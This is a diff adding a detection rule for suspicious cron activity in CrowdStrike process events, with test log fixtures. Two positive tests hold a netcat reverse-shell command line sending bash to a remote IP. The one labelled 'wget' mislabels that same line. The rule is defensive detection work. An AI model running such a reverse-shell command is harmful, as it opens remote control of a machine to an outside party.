@@ -1,0 +1,72 @@
+AnalysisType: rule
+Filename: crowdstrike_suspicious_cron.py
+RuleID: "Crowdstrike.SuspiciousCron"
+DisplayName: "Crowdstrike - Suspicious cron detected"
+Enabled: true
+LogTypes:
+  - Crowdstrike.FDREvent
+Tags:
+  - Crowdstrike.FDREvent
+  - Execution:Scheduled Task/Job
+Reports:
+  MITRE ATT&CK:
+    - TA0002:T1053
+Severity: High
+Description: A suspicious cron has been added
+Runbook: Analyze the command to ensure no nefarious activity is occurring
+Reference: https://en.wikipedia.org/wiki/Cron
+SummaryAttributes:
+  - aid
+  - p_any_ip_addresses
+Tests:
+  - Name: Suspicious - netcat listener
+    ExpectedResult: true
+    Log:
+      {
+        "event":
+          {
+            "CommandLine": "nc -e /bin/bash 237.233.242.58 80",
+            "aid": "bf5d6f13fdad4264a09ce0162997a8cf",
+            "aip": "11.11.11.111",
+            "cid": "295e1aec7ec41cc26443bc73ddd16249",
+            "event_platform": "Mac",
+            "event_simpleName": "ProcessRollup2",
+            "name": "ProcessRollup2MacV8",
+          },
+        "fdr_event_type": "ProcessRollup2",
+        "p_log_type": "Crowdstrike.FDREvent",
+      }
+  - Name: Suspicious - wget
+    ExpectedResult: true
+    Log:
+      {
+        "event":
+          {
+            "CommandLine": "nc -e /bin/bash 237.233.242.58 80",
+            "aid": "bf5d6f13fdad4264a09ce0162997a8cf",
+            "aip": "11.11.11.111",
+            "cid": "295e1aec7ec41cc26443bc73ddd16249",
+            "event_platform": "Mac",
+            "event_simpleName": "ProcessRollup2",
+            "name": "ProcessRollup2MacV8",
+          },
+        "fdr_event_type": "ProcessRollup2",
+        "p_log_type": "Crowdstrike.FDREvent",
+      }
+  - Name: Not Suspicious
+    ExpectedResult: false
+    Log:
+      {
+        "event":
+          {
+            "CommandLine": "/bin/cp /Library/Preferences/SystemConfiguration/preferences.plist /Library/Preferences/SystemConfiguration/preferences.plist.old",
+            "aid": "bf5d6f13fdad4264a09ce0162997a8cf",
+            "aip": "11.11.11.111",
+            "cid": "295e1aec7ec41cc26443bc73ddd16249",
+            "event_platform": "Mac",
+            "event_simpleName": "ProcessRollup2",
+            "name": "ProcessRollup2MacV8",
+          },
+        "fdr_event_type": "ProcessRollup2",
+        "p_log_type": "Crowdstrike.FDREvent",
+      }
